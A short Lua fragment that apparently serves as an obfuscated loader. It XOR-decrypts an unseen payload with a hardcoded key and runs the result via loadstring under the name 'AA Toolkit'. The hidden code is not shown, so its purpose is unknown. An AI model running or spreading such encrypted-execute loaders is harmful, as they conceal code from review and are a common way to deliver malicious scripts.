local encrypted=decode(payload)
local key=decode("6WAsmUulmWjTGiCCciRtoOENkaWbrwqxq3dGaUs6/74=")
local blocks={}
for first=1,#encrypted,4096 do
    local block={}
    for index=first,math.min(first+4095,#encrypted)do
        block[#block+1]=string.char(bit32.bxor(encrypted:byte(index),key:byte((index-1)%#key+1)))
    end
    blocks[#blocks+1]=table.concat(block)
end
local source=table.concat(blocks)
local run,problem=loadstring(source,'AA Toolkit')
assert(run,problem)
return run()
